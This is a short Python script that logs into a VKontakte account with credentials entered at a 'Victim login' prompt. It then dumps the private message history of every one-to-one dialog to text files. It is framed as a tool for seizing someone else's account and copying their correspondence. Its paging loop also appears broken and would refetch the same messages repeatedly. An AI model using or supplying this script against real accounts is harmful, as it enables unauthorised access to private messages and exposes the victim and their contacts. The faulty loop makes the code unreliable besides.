# coding: utf-8

import os
import vk_api
from multiprocessing.dummy import Pool
import datetime

login = input('Victim login:\n')
password = input('Password:\n')

vk = vk_api.VkApi(login, password)
vk.auth()
directory_name = 'messages'
name_dir = '{}_{}'.format(directory_name, login)
save_dir = ''


def get_dialogs_ids():
    # Получение id всех диалогов
    print('\nLogin successful\n')
    dialogs = {}
    items = vk.method('messages.getDialogs').get('items')
    for dialog in items:
        message = dict(dialog).get('message')
        user_id = message.get('user_id')
        if int(user_id) < 0:
            continue
        user_info = dict(vk.method('users.get', {'user_ids': user_id})[0])
        name = '{}_{}'.format(user_info.get('first_name'), user_info.get('last_name'))
        dialogs.update({user_id: name})
    return dialogs


def get_chat_history(user_id, count=200, **kwargs):
    # Получение объектов сообщений из диалога
    args = {
        'user_id': user_id,
        'count': count}

    for key in kwargs:
        args.update({key: kwargs.get(key)})
    return vk.method('messages.getHistory', args)


def dump_chat(chat):
    # Дамп сообщений
    name = chat[1]
    user_id = chat[0]
    file_path = os.path.join(save_dir, '{}{}'.format(name, '.txt'))
    print(file_path)
    messages = []

    messages_block = get_chat_history(user_id)
    if messages_block.get('count') == 0:
        return
    items = messages_block.get('items')
    last_message_id = items[0].get('id')

    messages.extend(items)
    while not messages_block.get('count') < 200:
        messages.extend(get_chat_history(user_id, start_message_id=last_message_id))

    messages.reverse()
    dump = open(file_path, 'w', encoding='utf-8')
    for item in messages:
        row = ''
        pattern = '{date} | {user:20s}: {msg}\n'
        body = item.get('body').split('\n')
        if item.get('from_id') != user_id:
            sender = 'I am'
        else:
            sender = name
        date = datetime.datetime.fromtimestamp(item.get('date'))
        for message in body:
            row += pattern.format(
                date=date,
                user=sender,
                msg=message
            )
            row.encode('utf-8')
        dump.write(row)
    dump.write('~'*30 + 'END' + '~'*30 + '\n')
    dump.close()


def dump_dialogs(user_ids):
    # Dump initialization
    if name_dir not in os.listdir(os.getcwd()):
        os.mkdir(name_dir)
    os.chdir(name_dir)
    global save_dir
    save_dir = os.getcwd()

    # uses threads
    pool = Pool(6)
    pool.map(dump_chat, user_ids.items())
    pool.close()

if __name__ == '__main__':
    dump_dialogs(get_dialogs_ids())
